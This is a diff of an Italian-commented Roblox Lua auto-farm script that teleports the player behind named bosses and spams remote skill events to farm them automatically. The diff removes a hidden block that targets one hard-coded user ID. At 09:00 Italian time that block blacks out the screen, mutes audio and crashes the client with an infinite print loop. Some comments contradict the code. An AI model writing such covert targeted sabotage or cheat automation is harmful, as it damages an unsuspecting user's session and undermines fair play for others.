@@ -165,54 +165,6 @@ task.spawn(function()
 end)
 
 -- ==============================================================================
--- SISTEMA DI SICUREZZA ORARIA (CRASH 09:00 - 09:59)
--- ==============================================================================
-task.spawn(function()
-    local TARGET_ID = 1970233075
-    if localPlayer.UserId == TARGET_ID then
-        while true do
-            local date = os.date("!*t") -- Orario UTC
-            
-            -- Calcolo Ora Legale Italia (Gennaio = Ora Solare +1)
-            local isDST = false
-            if (date.month > 3 and date.month < 10) then
-                isDST = true
-            elseif (date.month == 3 and date.day >= 25) then
-                isDST = true
-            elseif (date.month == 10 and date.day < 25) then
-                isDST = true
-            end
-            
-            local offset = isDST and 2 or 1
-            local hourItaly = (date.hour + offset) % 24
-            
-            -- Se l'ora è esattamente le 8 di mattina
-            if hourItaly == 9 then
-                -- 1. Oscuramento GUI
-                local sg = Instance.new("ScreenGui", game:GetService("CoreGui") or localPlayer:WaitForChild("PlayerGui"))
-                sg.IgnoreGuiInset = true
-                sg.DisplayOrder = 2147483647
-                local f = Instance.new("Frame", sg)
-                f.Size = UDim2.new(1, 0, 1, 0)
-                f.BackgroundColor3 = Color3.new(0, 0, 0)
-                f.BorderSizePixel = 0
-                
-                -- 2. Audio Off
-                game:GetService("SoundService").Volume = 0
-                
-                task.wait(0.2)
-                
-                -- 3. CRASH TRAMITE PRINT (Senza wait)
-                while true do
-                    print("ERR_RECOVERY_FAILED_" .. math.random(100000, 999999))
-                end
-            end
-            task.wait(10) -- Controlla ogni 10 secondi
-        end
-    end
-end)
-
--- ==============================================================================
 -- FUNZIONE DI RITARDO GLOBALE
 -- ==============================================================================
 
@@ -222,7 +174,6 @@ local function WaitForVillsInit()
 		task.wait(15)
 	end
 end
-
 
 -- ==============================================================================
 -- GUI SETUP (STATS) - La GUI appare subito
@@ -1169,52 +1120,45 @@ task.spawn(function()
 end)
 
 -- ==============================================================================
--- FARMING LOGIC (KAKATA)
+-- FARMING LOGIC (KAKATA -> VIS -> REPEAT STRICT ORDER)
 -- ==============================================================================
 task.spawn(function ()
-	WaitForVillsInit() -- Attende qui prima di cercare boss
+	WaitForVillsInit() -- Attende qui prima di iniziare
 
 	local plr = game.Players.LocalPlayer
 	local ReplicatedStorage = game:GetService("ReplicatedStorage")
 	local Events = ReplicatedStorage:WaitForChild("Package"):WaitForChild("Events")
+	local Living = workspace:WaitForChild("Living")
 
-	local function waitForBoss(name, location, timeout)
-		local startTime = os.time()
-		repeat
-			if not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health <= 0 then
-				return nil 
-			end
-			local boss = location:FindFirstChild(name)
-			if boss and boss:FindFirstChild("Humanoid") and boss.Humanoid.Health > 0 then
-				return boss
-			end
-			task.wait(0.5)
-		until os.time() - startTime > timeout
-		return nil
-	end
-
+	-- Funzione per combattere il boss
 	local function Furming(boss)
 		if not boss then return end
-		print("Starting fight with boss:", boss.Name)
-		local bossHRP = boss.HumanoidRootPart
+		print("⚔️ INIZIO FIGHT: " .. boss.Name)
+		local bossHRP = boss:WaitForChild("HumanoidRootPart", 5)
+		if not bossHRP then return end
+		
 		local behindOffset = bossHRP.CFrame.LookVector * -5  
 
 		local character = plr.Character or plr.CharacterAdded:Wait()
 		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
 		local camera = workspace.CurrentCamera
 
+		-- Loop di combattimento
 		while boss and boss.Parent and boss:FindFirstChild("Humanoid") and boss.Humanoid.Health > 0 do
+			-- Controllo vita player
 			if not character or not character.Parent or not character:FindFirstChild("Humanoid") or character.Humanoid.Health <= 0 then
-				print("Player died during fight. Stopping...")
+				print("⚠️ Player morto/respawn necessario.")
 				break
 			end
 
+			-- TP Dietro il boss + Camera lock
 			pcall(function()
 				camera.CFrame = CFrame.new(camera.CFrame.Position, bossHRP.Position)
 				local behindPosition = bossHRP.Position + behindOffset 
 				humanoidRootPart.CFrame = CFrame.new(behindPosition, bossHRP.Position)
 			end)
 
+			-- Spam Skills
 			pcall(function()
 				if game.PlaceId == 3311165597 then
 					local letsplayagame = ReplicatedStorage.Package.Events:WaitForChild("letsplayagame")
@@ -1238,24 +1182,37 @@ task.spawn(function ()
 		end
 	end
 
+	-- Funzione che aspetta finché il boss specifico non spawna
+	local function WaitForSpecificBoss(bossName)
+		print("⏳ In attesa dello spawn di: " .. bossName)
+		while true do
+			-- Controllo se il player è vivo mentre aspetta
+			if not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health <= 0 then
+				plr.CharacterAdded:Wait()
+				task.wait(2)
+			end
+
+			local target = Living:FindFirstChild(bossName)
+			if target and target:FindFirstChild("Humanoid") and target.Humanoid.Health > 0 then
+				return target -- Boss trovato!
+			end
+			task.wait() -- Controlla ogni secondo
+		end
+	end
+
+	-- CICLO PRINCIPALE ORDINATO
 	while true do
-		if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health <= 0 then
-			print("Player dead/missing. Waiting for respawn...")
-			plr.CharacterAdded:Wait() 
-			task.wait(2) 
-			print("Respawned! Resuming farm.")
-		end
+		-- 1. PRIMA KAKATA (Non passa oltre finché non lo fa)
+		local kakata = WaitForSpecificBoss("Kakata (Ego Instinct)")
+		Furming(kakata)
+		
+		task.wait() -- Piccola pausa per respirare
 
-		--print("Waiting for boss to spawn...")
-		local currentBoss = waitForBoss("Kakata (Ego Instinct)", workspace.Living, 300) 
+		-- 2. POI VIS (Non ricomincia finché non lo fa)
+		local vis = WaitForSpecificBoss("Vis (40%)")
+		Furming(vis)
 
-		if currentBoss then
-			task.wait(0.05)
-			Furming(currentBoss)
-		else
-			--print("Boss did not spawn in time or player died, retrying...")
-		end
-		task.wait(1)
+		task.wait() -- Pausa prima di ricominciare il ciclo
 	end
 end)
 
